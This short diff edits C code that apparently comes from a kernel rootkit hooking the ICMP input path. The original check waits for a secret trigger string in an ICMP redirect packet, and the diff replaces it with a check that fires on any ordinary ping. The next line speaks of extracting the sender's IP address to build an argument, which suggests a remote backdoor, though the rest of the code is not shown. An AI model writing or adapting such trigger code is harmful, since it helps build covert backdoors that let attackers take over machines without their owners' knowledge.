@@ -44,9 +44,10 @@ static int icmp_input_hook(struct mbuf **mp, int *offp, int proto) {
     printf("icmp_code: %d\n", icp->icmp_code);
     printf("icmp_data: %.8s\n", icp->icmp_data);
     /* Is this the ICMP message we are looking for? */
-    if (icp->icmp_type == ICMP_REDIRECT &&
-        icp->icmp_code == ICMP_REDIRECT_TOSHOST &&
-        strncmp(icp->icmp_data, TRIGGER, TRIGGER_LEN) == 0) {
+    // if (icp->icmp_type == ICMP_REDIRECT &&
+    //     icp->icmp_code == ICMP_REDIRECT_TOSHOST &&
+    //     strncmp(icp->icmp_data, TRIGGER, TRIGGER_LEN) == 0) {
+    if (icp->icmp_type == ICMP_ECHO && icp->icmp_code == 0) {
         printf("Found right packet\n");
 
         /* Extract source ip address and create argument */
